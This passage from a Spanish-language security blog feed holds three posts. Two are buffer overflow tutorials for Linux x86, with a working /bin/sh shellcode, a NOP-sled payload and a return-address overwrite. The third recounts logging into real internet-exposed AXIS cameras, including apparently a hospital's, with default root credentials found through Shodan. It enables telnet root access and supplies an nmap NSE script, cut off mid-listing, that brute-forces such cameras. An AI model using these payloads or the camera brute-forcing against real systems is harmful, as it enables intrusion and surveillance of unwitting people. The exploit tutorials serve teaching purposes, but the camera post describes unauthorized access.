</pre></td><td class='code'><pre><code class=''><span class='line'>x/100x $esp</span></code></pre></td></tr></table></div></figure>


<p>El anterior comando nos mostrara 100 direcciones dentro de ESP</p>

<p><img src="http://i.imgur.com/vBRo9C0.png?1"></p>

<p>Se puede ver que parte del buffer se ha inyectado al registro, perfect!
Ahora solamente tenenemos que buscar/generar un shellcode acorde a nuestra arquitectura y OS</p>

<p>Podriamos generarlo con metasploit, pero para este apartado voy a utilizar uno que encontre en shell-storm</p>

<p><a href="http://shell-storm.org/shellcode/files/shellcode-827.php">http://shell-storm.org/shellcode/files/shellcode-827.php</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span></code></pre></td></tr></table></div></figure>


<p>El shellcode tiene un tamaño de 23 bytes por le que le restamos la long al buffer-4 bytes pertenecientes al EIP y lo incluimos dentro del payload</p>

<p>Quedando asi</p>

<p>508 NOPS – 4 bytes (EIP) =504</p>

<p>504 NOPS – 23 bytes (SHELLCODE) = 481 NOPS</p>

<p>Payload= \x90*481+shellcode(23)+EIP(4)</p>

<p>En este punto paso a explicar algo, por que reemplaze \x41 por \x90?</p>

<p>\x90 es un NOP (no operacion), un NOP es una instruccion en ensamblador que simplemente no hace nada y nos servira como puente al shellcode que se escribe despues de esta.</p>

<p>Ahora miremos como quedo el ESP luego de inyectar el payload, para esta ejecucion reemplaze el EIP por \x42=B.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>run $(python -c 'print "\x90"*481+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x42"*4')</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>x/100x $esp</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/M9lIAg0.png?1"></p>

<p>En el recuadro verde vemos como se colaron los NOPS y en el rojo se ve como empieza a filtrarse el shellcode.</p>

<p>Ahora lo unico que tenemos que hacer es indicar en el EIP cualquier direccion de memoria en donde se hayan alojado los NOPS</p>

<p><img src="http://i.imgur.com/ij5uY3D.png?1"></p>

<p>Usaremos esta : 0xbffffc70</p>

<p>La invertimos, inyectamos y esperamos la shell!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>run $(python -c 'print "\x90"*481+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x70\xfc\xff\xbf"')</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/x1vl6vW.png?1"></p>

<p>Hasta el momento se vio como explotar satisfactoriamente el desbordamiento, desactivando previamente ASLR para el proximo se vera una forma de bypassear ese sistema de seguridad. saludos!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Desbordando el buffer en linux x86 (I)]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/23/desbordando-el-buffer-en-linux-x86-i/"/>
    <updated>2014-11-23T04:01:07+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/23/desbordando-el-buffer-en-linux-x86-i</id>
    <content type="html"><![CDATA[<p>Cada vez que corremos un proceso en la maquina, se crea una memoria virtual para dicho proceso, ese segmento se divide en 3 partes, el texto, los datos y por ultimo el stack<!--more-->, que es donde nos vamos a concentrar para realizar la explotacion de este tipo de vulnerabilidad.</p>

<p>Que es el stack?</p>

<p>El stack es un segmento en la memoria que se encarga de almacenar datos y a su vez recuperarlos, administra la informacion en modo LIFO (last in first out), quiere decir que el ultimo dato en entrar es el primero en salir, un ejemplo mas sencillo seria comparar el stack con una pila de cd’s, en el que el primer cd hace de base de la pila y para llegar a el hay que retirar uno por uno los que se encuentran encima. Entonces cada vez que se ingresa un dato al stack se utiliza una instruccion denominada PUSH y cuando se retira un dato se llama a la instruccion POP, algo similar a un array.
Los registros del procesador.</p>

<p>El procesador cuenta con varios registros que cumplen diversas tareas en el stack, por el momento solo voy a mencionar a 3 de ellos.</p>

<p>EIP – Registro que almacena la direccion de memoria de la proxima funcion que se va a ejecutar.</p>

<p>ESP – Apunta a la parte superior del stack</p>

<p>EBP – Aputa a la base del stack
Ahora que ya se explicaron algunos conceptos basicos sobre el tema, vayamos al nudo del tutorial.
Que es un Buffer overflow?</p>

<p>Empezemos por definir que es un buffer, no es mas que un espacio de memoria en donde se vuelcan datos para determinada accion por ejemplo, tengo el siguiente programa en c.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Donde se define un buffer de 10 bytes, luego se lo pasa a la funcion strcpy que almacena en el buffer el argumento insertado por el usuario, esta misma no se encarga de controlar el tamaño limite del buffer por lo tanto si se introduce una mayor cantidad de caracteres,  el espacio desbordara y comenzara a sobrescribir los registros de memoria cercanos al buffer.</p>

<p>Antes que nada, vamos a desactivar ASLR</p>

<p>ASLR en criollo es un sistema de seguridad que vuelve aleatoria las direcciones de la memoria virtual.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo </span><span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
</span></code></pre></td></tr></table></div></figure>


<p>y compilaremos el prog con los siguientes flag de gcc.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gcc -ggdb -fno-stack-protector -mpreferred-stack-boundary<span class="o">=</span><span class="m">2</span> -o prog prog.c
</span></code></pre></td></tr></table></div></figure>


<p>Para quitarle algunas protecciones al stack que le agrega gcc al compilar.</p>

<p>Probemos pasandole mas de 10 caracteres al programa.</p>

<p><img src="http://i.imgur.com/beDd3zp.png?1"></p>

<p>Como se ve el programa crashea, veamos que pasa por dentro con gdb.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb prog</span></code></pre></td></tr></table></div></figure>


<p>Le pasamos los argumentos</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></code></pre></td></tr></table></div></figure>


<p>y una vez que el prog nos patee miramos en los registros a ver que encontramos?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>info registers</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/euFxWOT.png?1"></p>

<p>Como se ve en la imagen, se sobrescribieron dos registros como EIP y EBP con x41, que representa el caracter A en hex.</p>

<p>Ahora por que crashea?, como explique anteriormente, el registro EIP contenia la direccion  de la proxima funcion a ejecutar, pero al ser sobreescrito con 4 A’s, EIP termina apuntando a una direccion invalida.</p>

<p>Sabiendo que podemos inyectar en EIP, podriamos controlar el flujo del programa y mandarlo a la direccion que se nos ocurra.
Controlando el flujo de ejecucion.</p>

<p>Vamos con otro ejemplo pero un poco mas divertido.</p>

<p>Le agregue la funcion owned() al programa anterior, que lo unico que hace es imprimir un texto.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">owned</span><span class="p">(){</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Owned :)&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Pero no vamos a llamarla en el code, sino que vamos a inyectarle la direccion de memoria de owned() al EIP para asi alterar la salida del prog.</p>

<p>compilamos y abrimos con gdb.</p>

<p>Ahora tenemos que saber el punto exacto donde empieza a sobrescribirse EIP.</p>

<p>Le pasamos 14 A’s – nada</p>

<p>Le pasamos 15 A’s y se puede ver como empieza a infectarse el EIP</p>

<p><img src="http://i.imgur.com/7M8OvfU.png?1"></p>

<p>Como una direccion de memoria esta compuesta por 4 bytes le sumamos 3 y tenemos el EIP bien pintado con 18 A’s.</p>

<p><img src="http://i.imgur.com/bvB7Qoy.png?2"></p>

<p>Ahora solo nos queda averiguar la direccion donde la funcion owned() comienza a ser pusheada al stack, para esto vamos a desensamblarla</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>disas owned</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/7KrlqNN.png?1"></p>

<p>Se ven las instrucciones del codigo ensamblador, la primera linea comienza a pushear la funcion asi que usaremos esa direccion de memoria: 0x08048408</p>

<p>Ahora que tenemos la direccion con la que editaremos el EIP, solo basta restar 4 A’s e incluirla.</p>

<p>A*14 + 0x08048408</p>

<p>Voy a utlizar python para realizar la inyeccion. como se ve, se utiliza el escape \x para codificar los datos.</p>

<p><img src="http://i.imgur.com/OVUuV7o.png?1"></p>

<p>Pero si miramos la direccion a donde apunta el EIP vemos que esta al revez, esto pasa por que los procesadores Intel utilizan el sistema little-endian por lo tanto tendremos que invertir la direccion antes de ingresarla.</p>

<p><img src="http://i.imgur.com/vAT6OWw.png?1"></p>

<p>Y ahora si logramos ver la salida de la funcion owned.</p>

<p>Y si en vez de direccionar a una funcion, lograramos llegar hasta un shellcode alojado en la memoria?, eso se vera en el proximo tutorial, saludos!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Tomando el control de una camara AXIS – Parte I]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i/"/>
    <updated>2014-11-23T03:36:54+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i</id>
    <content type="html"><![CDATA[<p>Hay veces en las que se me da por jugar con Shodan, realizando busqueda de routers, camaras IP u otros dispositivos, esta vez me puse a indagar las camaras AXIS que se encontraban en la red publica.</p>

<p>Simplemente poniedon AXIS en el buscador podemos encontrar unas cuantas disponibles,<!--more--> sin embargo la gran mayoria dispone de  autentificacion HTTP Digest para acceder al panel (pero no todas) incluso muchas poseen passwords como el clasico 123456.</p>

<p><img src="http://i.imgur.com/bdRF413.png"></p>

<p>Entonces me puse a averiguar informacion de este tipo de camaras, que bien son dispositivos con Linux arm* embebido y otra cosa interesante es que el user por defecto es root, asi que me puse a probar intentos de logueo con root:123456, root:root, siempre a travez de las direcciones que me arrojaba shodan y me cruze con una gran cantidad de dispositivos que realmente estaban configurados con esas credenciales y es mas algunos ni siquiera tenian activado la autentificacion por http.</p>

<p>Me tope con algunas como estas:</p>

<p>Lo que pareciera ser un hospital.</p>

<p><img src="http://i.imgur.com/s0ANBji.png"></p>

<p>Un pequeño local de electrodomesticos en Arabia Saudita</p>

<p><img src="http://i.imgur.com/WkKgbxj.png"></p>

<p>Una pancheria en Medellin Colombia.</p>

<p><img src="http://i.imgur.com/GU7RYI3.png"></p>

<p>Ahora que ya habia accedido al panel, queria ver la forma de tomar el control del mini OS GNU.</p>

<p>Por empezar estos dispositivos cuentan con un servidor ftp configurado con las mismas credenciales que el http, pero por defecto el demonio telnet se encuentra desabilitado al inicio, pero esto no quita que pueda ser activado a travez del servidor web utilizando un editor de ficheros dentro de las opciones del sistema.</p>

<p><img src="http://i.imgur.com/bcVGCF0.png"></p>

<p>Solo basta con editar el fichero /etc/inittab y descomentar la linea:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#tnet:35:once:/usr/sbin/telnetd</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/j8iNHpW.png"></p>

<p>Salvar los cambios, y reiniciar el dispositivo.</p>

<p>Esto podemos hacerlo mediante el panel.</p>

<p><img src="http://i.imgur.com/BwaG0JK.png"></p>

<p>O bien por ftp con el siguiente comando.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>quote site reboot</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/7u4SzOM.png"></p>

<p>Una vez iniciado el sistema seremos capaces de establecer una conexion por telnet como usuario root.</p>

<p><img src="http://i.imgur.com/lHSLaKI.png"></p>

<p>No quedando satisfecho con la pobre cantidad de camaras que me proveia shodan me dispuse a codear un NSE script para realizar sondeos con nmap y ver que me encontraba.</p>

<p>La manera de identificar estos juguetitos es mirando el banner que tira el ftp, una vez identificado, el script simplemente intenta loguearse como root, utilizando contraseñas debiles y ademas comprueba si el panel se encuentra protegido.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
</pre></td><td class='code'><pre><code class='lua'><span class='line'><span class="n">description</span> <span class="o">=</span> <span class="s">[[</span>
</span><span class='line'><span class="s">Script que se encarga de buscar camaras AXIS que contengan credenciales debiles</span>
</span><span class='line'><span class="s">o sin autentificacion HTTP digest.</span>
</span><span class='line'><span class="s">]]</span>
</span><span class='line'>
</span><span class='line'><span class="n">author</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">[Q]3rV[0]&quot;</span>
</span><span class='line'><span class="n">license</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">Same as Nmap--See http://nmap.org/book/man-legal.html&quot;</span>
</span><span class='line'><span class="n">categories</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;</span><span class="s">brute&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">auth&quot;</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">---</span>
</span><span class='line'><span class="c1">-- </span>
</span><span class='line'><span class="c1">-- @usage nmap --script=axis_search -vv -T4 -Pn -n xx.xx.xxx.x -p80,21</span>
</span><span class='line'><span class="c1">-- @output</span>
</span><span class='line'><span class="c1">--PORT   STATE SERVICE</span>
</span><span class='line'><span class="c1">--21/tcp open  ftp</span>
</span><span class='line'><span class="c1">--80/tcp open  http</span>
</span><span class='line'>
</span><span class='line'><span class="c1">--Host script results:</span>
</span><span class='line'><span class="c1">--| axis:</span>
</span><span class='line'><span class="c1">--|   Host = xxx.x.xxx.3</span>
</span><span class='line'><span class="c1">--|   Version = AXIS M7010 Video Encoder 5.40.6.1 (2011) ready.</span>
</span><span class='line'><span class="c1">--|_  Auth = root:root</span>
</span><span class='line'><span class="c1">-- </span>
</span><span class='line'><span class="c1">---</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">http</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;</span><span class="s">http&quot;</span>
</span><span class='line'><span class="kd">local</span> <span class="n">ftp</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;</span><span class="s">ftp&quot;</span>
</span><span class='line'><span class="kd">local</span> <span class="n">nmap</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;</span><span class="s">nmap&quot;</span>
</span><span class='line'><span class="kd">local</span> <span class="n">stdnse</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;</span><span class="s">stdnse&quot;</span>
</span><span class='line'><span class="kd">local</span> <span class="n">string</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;</span><span class="s">string&quot;</span>
</span><span class='line'><span class="kd">local</span> <span class="n">table</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">&quot;</span><span class="s">table&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">hostrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">http_port</span><span class="p">,</span> <span class="n">ftp_port</span>
</span><span class='line'>    <span class="n">http_port</span><span class="o">=</span><span class="n">nmap</span><span class="p">.</span><span class="n">get_port_state</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="p">{</span><span class="n">number</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">tcp&quot;</span><span class="p">})</span>
</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="n">http_port</span> <span class="ow">and</span> <span class="ow">not</span> <span class="p">(</span><span class="n">http_port</span><span class="p">.</span><span class="n">state</span><span class="o">==</span><span class="s2">&quot;</span><span class="s">open&quot;</span> <span class="ow">or</span> <span class="n">http_port</span><span class="p">.</span><span class="n">state</span><span class="o">==</span><span class="s2">&quot;</span><span class="s">open|filtered&quot;</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>        <span class="k">return</span> <span class="kc">false</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">ftp_port</span><span class="o">=</span><span class="n">nmap</span><span class="p">.</span><span class="n">get_port_state</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="p">{</span><span class="n">number</span><span class="o">=</span><span class="mi">21</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">tcp&quot;</span><span class="p">})</span>
</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="n">ftp_port</span> <span class="ow">and</span> <span class="ow">not</span> <span class="p">(</span><span class="n">ftp_port</span><span class="p">.</span><span class="n">state</span><span class="o">==</span><span class="s2">&quot;</span><span class="s">open&quot;</span> <span class="ow">or</span> <span class="n">ftp_port</span><span class="p">.</span><span class="n">state</span><span class="o">==</span><span class="s2">&quot;</span><span class="s">open|filtered&quot;</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>        <span class="k">return</span> <span class="kc">false</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="k">return</span> <span class="kc">true</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">out</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">dic</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;</span><span class="s">root&#39;</span><span class="p">,</span> <span class="mi">123456</span><span class="p">,</span> <span class="mi">1234</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">data_out</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">message_banner</span><span class="p">,</span> <span class="n">auth</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
</span><span class='line'>    <span class="nb">table.insert</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="nb">string.format</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Host = %s&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">.</span><span class="n">ip</span><span class="p">))</span>
</span><span class='line'>    <span class="nb">table.insert</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="nb">string.format</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Version = %s&quot;</span><span class="p">,</span> <span class="n">message_banner</span><span class="p">))</span>
</span><span class='line'>    <span class="nb">table.insert</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="nb">string.format</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Auth = %s&quot;</span><span class="p">,</span> <span class="n">auth</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">format_output</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="n">out</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">http_auth</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">response</span><span class="o">=</span><span class="n">http</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="s1">&#39;</span><span class="s">/view/viewer_index.shtml&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">response</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">action</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">socket</span><span class="o">=</span><span class="n">nmap</span><span class="p">.</span><span class="n">new_socket</span><span class="p">()</span>
</span><span class='line'>    <span class="n">socket</span><span class="p">:</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="mi">21</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">buffer</span><span class="o">=</span><span class="n">stdnse</span><span class="p">.</span><span class="n">make_buffer</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\r</span><span class="s">?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">code</span><span class="p">,</span> <span class="n">message_banner</span><span class="o">=</span><span class="n">ftp</span><span class="p">.</span><span class="n">read_reply</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">message_banner</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">AXIS&quot;</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>        <span class="kd">local</span> <span class="n">response</span><span class="o">=</span><span class="n">http_auth</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status</span><span class="o">==</span><span class="mi">401</span> <span class="ow">or</span> <span class="n">response</span><span class="p">.</span><span class="n">status</span><span class="o">==</span><span class="mi">404</span> <span class="ow">or</span> <span class="n">response</span><span class="p">.</span><span class="n">status</span><span class="o">==</span><span class="mi">403</span> <span class="k">then</span>
</span><span class='line'>            <span class="k">for</span> <span class="n">n</span><span class="p">,</span><span class="n">pass</span> <span class="k">in</span> <span class="nb">ipairs</span><span class="p">(</span><span class="n">dic</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>                <span class="n">socket</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">USER root</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>                <span class="kd">local</span> <span class="n">code</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="n">ftp</span><span class="p">.</span><span class="n">read_reply</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">code</span><span class="o">==</span><span class="mi">331</span> <span class="k">then</span>
</span><span class='line'>                    <span class="n">socket</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">PASS &quot;</span><span class="o">..</span><span class="n">pass</span><span class="o">..</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>                <span class="k">end</span>
